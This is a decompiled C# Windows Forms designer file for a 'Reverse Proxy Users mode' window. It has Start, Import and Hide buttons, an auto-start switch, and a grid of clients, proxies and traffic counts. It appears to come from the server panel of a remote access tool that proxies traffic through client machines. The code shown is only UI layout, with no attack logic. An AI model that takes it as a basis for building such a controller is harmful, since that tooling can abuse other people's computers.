namespace Server.Forms
{
	// Token: 0x020000A1 RID: 161
	public partial class FormReverseProxyU : global::Server.Helper.FormMaterial
	{
		// Token: 0x06000479 RID: 1145 RVA: 0x0003868C File Offset: 0x0003688C
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600047A RID: 1146 RVA: 0x000386AC File Offset: 0x000368AC
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormReverseProxyU));
			this.rjButton1 = new global::CustomControls.RJControls.RJButton();
			this.GridIps = new global::System.Windows.Forms.DataGridView();
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.rjButton3 = new global::CustomControls.RJControls.RJButton();
			this.materialSwitch2 = new global::MaterialSkin.Controls.MaterialSwitch();
			this.rjButton2 = new global::CustomControls.RJControls.RJButton();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.Column6 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column2 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column5 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column3 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column4 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			((global::System.ComponentModel.ISupportInitialize)this.GridIps).BeginInit();
			this.panel1.SuspendLayout();
			base.SuspendLayout();
			this.rjButton1.BackColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BackgroundColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BorderColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton1.BorderRadius = 0;
			this.rjButton1.BorderSize = 0;
			this.rjButton1.FlatAppearance.BorderSize = 0;
			this.rjButton1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.rjButton1.ForeColor = global::System.Drawing.Color.White;
			this.rjButton1.Location = new global::System.Drawing.Point(7, 7);
			this.rjButton1.Name = "rjButton1";
			this.rjButton1.Size = new global::System.Drawing.Size(92, 27);
			this.rjButton1.TabIndex = 3;
			this.rjButton1.Text = "Start";
			this.rjButton1.TextColor = global::System.Drawing.Color.White;
			this.rjButton1.UseVisualStyleBackColor = false;
			this.rjButton1.Click += new global::System.EventHandler(this.rjButton1_Click);
			this.GridIps.AllowUserToAddRows = false;
			this.GridIps.AllowUserToDeleteRows = false;
			this.GridIps.AllowUserToResizeColumns = false;
			this.GridIps.AllowUserToResizeRows = false;
			this.GridIps.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.GridIps.BackgroundColor = global::System.Drawing.Color.White;
			this.GridIps.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.GridIps.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.GridIps.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.GridIps.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.GridIps.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.GridIps.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column6,
				this.Column1,
				this.Column2,
				this.Column5,
				this.Column3,
				this.Column4
			});
			this.GridIps.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.GridIps.DefaultCellStyle = dataGridViewCellStyle2;
			this.GridIps.EnableHeadersVisualStyles = false;
			this.GridIps.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.GridIps.Location = new global::System.Drawing.Point(6, 104);
			this.GridIps.Name = "GridIps";
			this.GridIps.ReadOnly = true;
			this.GridIps.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.GridIps.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.GridIps.RowHeadersVisible = false;
			this.GridIps.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.GridIps.ShowCellErrors = false;
			this.GridIps.ShowCellToolTips = false;
			this.GridIps.ShowEditingIcon = false;
			this.GridIps.ShowRowErrors = false;
			this.GridIps.Size = new global::System.Drawing.Size(742, 392);
			this.GridIps.TabIndex = 14;
			this.panel1.BackColor = global::System.Drawing.Color.White;
			this.panel1.Controls.Add(this.rjButton3);
			this.panel1.Controls.Add(this.rjButton1);
			this.panel1.Controls.Add(this.materialSwitch2);
			this.panel1.Controls.Add(this.rjButton2);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.panel1.Location = new global::System.Drawing.Point(3, 64);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(749, 435);
			this.panel1.TabIndex = 15;
			this.rjButton3.BackColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton3.BackgroundColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton3.BorderColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton3.BorderRadius = 0;
			this.rjButton3.BorderSize = 0;
			this.rjButton3.FlatAppearance.BorderSize = 0;
			this.rjButton3.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.rjButton3.ForeColor = global::System.Drawing.Color.White;
			this.rjButton3.Location = new global::System.Drawing.Point(105, 7);
			this.rjButton3.Name = "rjButton3";
			this.rjButton3.Size = new global::System.Drawing.Size(92, 27);
			this.rjButton3.TabIndex = 17;
			this.rjButton3.Text = "Import";
			this.rjButton3.TextColor = global::System.Drawing.Color.White;
			this.rjButton3.UseVisualStyleBackColor = false;
			this.rjButton3.Click += new global::System.EventHandler(this.rjButton3_Click);
			this.materialSwitch2.AutoSize = true;
			this.materialSwitch2.Depth = 0;
			this.materialSwitch2.Location = new global::System.Drawing.Point(298, 3);
			this.materialSwitch2.Margin = new global::System.Windows.Forms.Padding(0);
			this.materialSwitch2.MouseLocation = new global::System.Drawing.Point(-1, -1);
			this.materialSwitch2.MouseState = global::MaterialSkin.MouseState.HOVER;
			this.materialSwitch2.Name = "materialSwitch2";
			this.materialSwitch2.Ripple = true;
			this.materialSwitch2.Size = new global::System.Drawing.Size(129, 37);
			this.materialSwitch2.TabIndex = 16;
			this.materialSwitch2.Text = "Auto Start";
			this.materialSwitch2.UseVisualStyleBackColor = true;
			this.materialSwitch2.CheckedChanged += new global::System.EventHandler(this.materialSwitch2_CheckedChanged);
			this.rjButton2.BackColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton2.BackgroundColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton2.BorderColor = global::System.Drawing.Color.FromArgb(192, 0, 192);
			this.rjButton2.BorderRadius = 0;
			this.rjButton2.BorderSize = 0;
			this.rjButton2.FlatAppearance.BorderSize = 0;
			this.rjButton2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.rjButton2.ForeColor = global::System.Drawing.Color.White;
			this.rjButton2.Location = new global::System.Drawing.Point(203, 7);
			this.rjButton2.Name = "rjButton2";
			this.rjButton2.Size = new global::System.Drawing.Size(92, 27);
			this.rjButton2.TabIndex = 16;
			this.rjButton2.Text = "Hide";
			this.rjButton2.TextColor = global::System.Drawing.Color.White;
			this.rjButton2.UseVisualStyleBackColor = false;
			this.rjButton2.Click += new global::System.EventHandler(this.rjButton2_Click);
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick_1);
			this.Column6.HeaderText = "Client";
			this.Column6.MinimumWidth = 120;
			this.Column6.Name = "Column6";
			this.Column6.ReadOnly = true;
			this.Column6.Width = 120;
			this.Column1.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
			this.Column1.HeaderText = "Proxy";
			this.Column1.MinimumWidth = 120;
			this.Column1.Name = "Column1";
			this.Column1.ReadOnly = true;
			this.Column1.Width = 150;
			this.Column2.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column2.HeaderText = "Status";
			this.Column2.MinimumWidth = 100;
			this.Column2.Name = "Column2";
			this.Column2.ReadOnly = true;
			this.Column5.HeaderText = "Connects";
			this.Column5.MinimumWidth = 100;
			this.Column5.Name = "Column5";
			this.Column5.ReadOnly = true;
			this.Column3.HeaderText = "Recives";
			this.Column3.MinimumWidth = 100;
			this.Column3.Name = "Column3";
			this.Column3.ReadOnly = true;
			this.Column4.HeaderText = "Sents";
			this.Column4.MinimumWidth = 100;
			this.Column4.Name = "Column4";
			this.Column4.ReadOnly = true;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(755, 502);
			base.Controls.Add(this.GridIps);
			base.Controls.Add(this.panel1);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MinimumSize = new global::System.Drawing.Size(560, 443);
			base.Name = "FormReverseProxyU";
			this.Text = "Reverse Proxy Users mode [0]";
			base.Load += new global::System.EventHandler(this.RemoteDesktop_Load);
			((global::System.ComponentModel.ISupportInitialize)this.GridIps).EndInit();
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040002D2 RID: 722
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040002D3 RID: 723
		public global::CustomControls.RJControls.RJButton rjButton1;

		// Token: 0x040002D4 RID: 724
		public global::System.Windows.Forms.DataGridView GridIps;

		// Token: 0x040002D5 RID: 725
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x040002D6 RID: 726
		public global::CustomControls.RJControls.RJButton rjButton2;

		// Token: 0x040002D7 RID: 727
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x040002D8 RID: 728
		public global::MaterialSkin.Controls.MaterialSwitch materialSwitch2;

		// Token: 0x040002D9 RID: 729
		public global::CustomControls.RJControls.RJButton rjButton3;

		// Token: 0x040002DA RID: 730
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column6;

		// Token: 0x040002DB RID: 731
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column1;

		// Token: 0x040002DC RID: 732
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column2;

		// Token: 0x040002DD RID: 733
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column5;

		// Token: 0x040002DE RID: 734
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column3;

		// Token: 0x040002DF RID: 735
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column4;
	}
}
